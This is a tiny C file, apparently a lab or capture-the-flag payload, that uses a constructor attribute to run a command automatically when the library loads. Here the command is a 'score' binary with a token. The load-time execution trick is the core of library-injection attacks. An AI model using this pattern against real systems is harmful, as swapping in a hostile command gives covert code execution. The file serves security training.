#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score a41e127c-4c3d-438b-a829-5a4c09bc82ce");
}
